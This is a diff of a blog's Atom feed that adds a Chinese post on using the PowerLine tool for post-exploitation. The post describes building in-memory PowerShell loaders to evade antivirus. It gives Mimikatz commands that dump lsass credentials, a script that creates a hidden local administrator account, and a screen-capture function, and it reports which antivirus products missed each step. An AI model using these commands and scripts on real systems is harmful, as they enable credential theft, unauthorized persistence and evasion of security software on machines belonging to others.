@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zjw.dropsec.xyz/"/>
-  <updated>2019-11-29T10:20:28.905Z</updated>
+  <updated>2019-12-24T13:43:26.711Z</updated>
   <id>https://zjw.dropsec.xyz/</id>
   
   <author>
@@ -16,16 +16,37 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>test</title>
-    <link href="https://zjw.dropsec.xyz/uncategorized/2019/11/29/test.html"/>
-    <id>https://zjw.dropsec.xyz/uncategorized/2019/11/29/test.html</id>
-    <published>2019-11-29T10:20:28.000Z</published>
-    <updated>2019-11-29T10:20:28.905Z</updated>
+    <title>PowerShell之PowerLine.md</title>
+    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2019/12/24/PowerShell%E4%B9%8BPowerLine.html"/>
+    <id>https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html</id>
+    <published>2019-12-24T13:36:43.000Z</published>
+    <updated>2019-12-24T13:43:26.711Z</updated>
+    
+    <content type="html"><![CDATA[<p>　　在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。</p>
+<h2 id="0x01-PowerLine"><a href="#0x01-PowerLine" class="headerlink" title="0x01 PowerLine"></a>0x01 PowerLine</h2><p><a href="https://github.com/fullmetalcache/PowerLine" target="_blank" rel="external">下载链接</a><a id="more"></a><br><img src="https://i.loli.net/2019/12/24/3KVLXle27nY8C4j.png" alt="1.png"><br><strong>优点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、快速安装、编译、运行，不需要安装Visual Studio PowerShell</div><div class="line">2、对加载的powershell脚本进行编码绕过</div><div class="line">3、执行编译好的exe，脚本在内存中运行</div></pre></td></tr></table></figure></p>
+<p><strong>缺点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、需要对目标系统版本号了解，本地搭建相同环境编译</div><div class="line">2、运行需要按照powershell执行方式</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-安装、编译"><a href="#0x02-安装、编译" class="headerlink" title="0x02 安装、编译"></a>0x02 安装、编译</h2><p>整个代码框架如下，脚本家在加载配置文件为<strong>UserConf.xml</strong>。<br><img src="https://i.loli.net/2019/12/24/V9tH5K6ZWXuBzno.png" alt="2.png"><br>使用过程如下：<br>1、运行build.bat<br><img src="https://i.loli.net/2019/12/24/xYLQa3GU9bpXVh2.png" alt="3.png"><br>2、配置UserConf.xml文件，修改为需要远程加载编译的URL，自己本地的话把写好的powershell放到自己起的web里面就行。<br><img src="https://i.loli.net/2019/12/24/tRVD7mwgBhxfYsI.png" alt="4.png"><br>3、运行PLBuilder.exe，回根据运行的系统版本编译成对应的exe<br><img src="https://i.loli.net/2019/12/24/5frOU43nNHxCBPR.png" alt="5.png"><br>整个流程就这简单的三步，会在目录下生成1个PowerLine.exe，7个常见的ps脚本已经编译在里面了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PowerLine.exe -ShowScripts //显示嵌入的脚本</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/dMlVaJAOWSi9cqz.png" alt="6.png"><br>之后可以根据每个脚本的使用命令执行相关的操作。</p>
+<h2 id="0x03-后渗透"><a href="#0x03-后渗透" class="headerlink" title="0x03 后渗透"></a>0x03 后渗透</h2><p><strong>1、Minikatz</strong><br>普通的Minikatz已经被各大杀软查杀，都修改源码重新编译进行绕过，使用PowerLine加载Minikatz.ps也可以绕过一些免杀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//dump lsass.exe </div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;privilege::debug`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div><div class="line">//dump lsass.exe 为dmp</div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;sekurlsa::minidump lsass_dump_name.dmp`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/oeIK7PCfT21wtYD.gif" alt="7.gif"><br>直接dump密码这种360可以检测到了，其他2款没有检测到。<br><strong>2、添加用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">For($i=0;$i -lt $args.Count; $i++)</div><div class="line">&#123;</div><div class="line">    $User = $($args[0]);</div><div class="line">	$Passwd = $($args[1]);</div><div class="line">&#125;</div><div class="line">$Computer = [ADSI]&quot;WinNT://$Env:COMPUTERNAME,Computer&quot;;</div><div class="line">$CompStat = Get-WmiObject win32_computersystem;</div><div class="line">$Computer2 = $CompStat.Name;</div><div class="line">$LocalAdmin = $Computer.Create(&quot;User&quot;, $User);</div><div class="line">$LocalAdmin.SetPassword($Passwd);</div><div class="line">$LocalAdmin.SetInfo();</div><div class="line">$group = [ADSI](&apos;WinNT://&apos; + $Computer2 + &apos;/Administrators,group&apos;);</div><div class="line">$adduser = (&quot;WinNT://&quot; + $Computer2 + &quot;/&quot; + $User);</div><div class="line">$group.add($adduser);</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/owPbxh2tfWgX5pH.gif" alt="8.gif"><br>几款杀软都没有检测到。<br><strong>3、截图</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">function Get-ScreenCapture</div><div class="line">&#123;</div><div class="line">    param(    </div><div class="line">    [Switch]$OfWindow        </div><div class="line">    )</div><div class="line"></div><div class="line"></div><div class="line">    begin &#123;</div><div class="line">        Add-Type -AssemblyName System.Drawing</div><div class="line">        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | </div><div class="line">            Where-Object &#123; $_.FormatDescription -eq &quot;JPEG&quot; &#125;</div><div class="line">    &#125;</div><div class="line">    process &#123;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        if ($OfWindow) &#123;            </div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;%&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125; else &#123;</div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        $bitmap = [Windows.Forms.Clipboard]::GetImage()    </div><div class="line">        $ep = New-Object Drawing.Imaging.EncoderParameters  </div><div class="line">        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  </div><div class="line">        $screenCapturePathBase = &quot;$pwd\ScreenCapture&quot;</div><div class="line">        $c = 0</div><div class="line">        while (Test-Path &quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;) &#123;</div><div class="line">            $c++</div><div class="line">        &#125;</div><div class="line">        $bitmap.Save(&quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;, $jpegCodec, $ep)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/12/24/rAxiDIX3fvkyPNB.gif" alt="9.gif"></p>
+<p>　　这里只是尝试了常见的后渗透利用方法，利用powershell后渗透还是很有成效。大家可以使用PS实现其他功能。虽然现在不杀，不一定之后还能用，且用且珍惜。</p>
+]]></content>
     
     <summary type="html">
     
+      &lt;p&gt;　　在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。&lt;/p&gt;
+&lt;h2 id=&quot;0x01-PowerLine&quot;&gt;&lt;a href=&quot;#0x01-PowerLine&quot; class=&quot;headerlink&quot; title=&quot;0x01 PowerLine&quot;&gt;&lt;/a&gt;0x01 PowerLine&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/fullmetalcache/PowerLine&quot;&gt;下载链接&lt;/a&gt;
+    
     </summary>
     
+      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="PowerShell" scheme="https://zjw.dropsec.xyz/tags/PowerShell/"/>
     
   </entry>
   
@@ -1338,9 +1359,9 @@
       <category term="CTF" scheme="https://zjw.dropsec.xyz/categories/CTF/"/>
     
     
-      <category term="CTF" scheme="https://zjw.dropsec.xyz/tags/CTF/"/>
-    
       <category term="密码学" scheme="https://zjw.dropsec.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="CTF" scheme="https://zjw.dropsec.xyz/tags/CTF/"/>
     
   </entry>
   
